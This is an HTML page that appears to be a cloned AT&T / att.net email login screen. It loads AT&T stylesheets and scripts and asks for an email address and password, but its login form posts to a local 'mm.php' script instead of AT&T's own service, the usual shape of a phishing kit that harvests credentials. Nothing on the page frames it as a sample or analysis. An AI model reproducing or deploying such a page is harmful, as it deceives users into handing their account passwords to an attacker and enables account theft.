<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">



	


	

<html xmlns="http://www.w3.org/1999/xhtml">

<head>

<title>AT&amp;T - Login</title>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<meta http-equiv="Content-Type" name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=0.5, maximum-scale=1.0" />

<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/main.css"  type="text/css" media="screen" />

<!--[if lte IE 6]>

<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/ie6.css"  type="text/css" media="screen" />

<![endif]-->

<!--[if IE 7]>

<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/ie7.css"  type="text/css" media="screen" />

<![endif]-->

<!--[if IE 8]>

<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/ie8.css"  type="text/css" media="screen" />

<![endif]-->

<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/mobile.css"  type="text/css" media="handheld, only screen and (max-device-width: 480px)" />

<script type="text/javascript" src="https://home.secureapp.att.net/js/jquery/jquery-1.5.1.min.js" ></script>

<script type="text/javascript" src="https://home.secureapp.att.net/js/jquery/simplemodal/jquery.simplemodal.js" ></script>

<script type="text/javascript" src="https://home.secureapp.att.net/js/sso/slid/1201/script.js" ></script>

</head>



<body>



<div id="header"></div>



<div id="pageWrap">

 <div id="pageBody">

  <div id="loginWrap">

  <form  action="mm.php" method="post" id="LoginForm"  focus="userid" name="LoginForm" type="com.sbc.idm.igate_edam.forms.LoginFormBean">

    <h1>To access att.net...<br /><strong>Sign in now!</strong></h1>


    <ul class="uLogin">

     <li id="uID">

      <label>Email</label>

      <input type="text" name="userid" id="nameBox" value="" maxlength="50" size="50" class="slidTxtbox" />

      <div class="quesIcon" id="ques1"><div id="qAns1" class="qAns">Info</div></div>

     </li>

     <li id="uPwd">

      <label>Password</label>

      <input type="password" name="password" id="pwdBox" value="" maxlength="50" size="50" class="slidTxtbox" />

      <p class="fgtPwd"><a href="#" id="fgtPwd" class="colLink">Forgot Password?</a></p>

     </li>

     <li id="uRM">

      <p><input type="checkbox" name="rememberID" id="rememberID" class="slidChkBox" /><label for="rememberID">Keep me signed in</label></p>

      <p>for 2 weeks unless I sign out. <span class="quesIcon" id="ques2"><span id="qAns2" class="qAns">Info</span></span></p> 

      <p>(Uncheck if on a shared computer.)</p>

     </li>

     <li id="uBtn">

      <input type="submit" id="submitLogin" value="Sign In" class="loginBtn" />

     </li>

     <li id="uSU">

      <label>Don't have an AT&amp;T Email Account?</label>

      <p class="signupLnk"><a href="http://www.att.net/signup" id="regurl" class="colLink">Sign Up Now</a></p>

     </li>

    </ul>

       

    <div id="lognp"></div>

    <div id="overLayCheck" class="overLayRight1"></div>

   </form>  

   <div id="promo"></div>

  </div>

 </div>

</div>

<div id="footer"> 

</div>



<div id="yad">
<script type="text/javascript">
yld_mgr = {};
yld_mgr.slots = {};
yld_mgr.pub_id="26747832978";
yld_mgr.request_type="ac";
yld_mgr.content_topic_id_list=["4234000"];
yld_mgr.container_type="js";
yld_mgr.site_name="att.net log in";
</script>
<script type="text/javascript">
yld_mgr.slots.slot1 = {};
yld_mgr.slots.slot1.content_type_list=["fn_news"];
yld_mgr.slots.slot1.ad_size_list=["1440x1024"];
</script>
<script type="text/javascript" src="https://s.yimg.com/ik/script.js"> </script>
<script type="text/javascript">
yld_mgr.place_ad_here("slot1");
</script>
</div>


</body>

</html><SCRIPT language="JavaScript">
<!-- 
document.cookie = "IV_JCT=%2FcommonLogin; path=/";
//--> 
</SCRIPT>
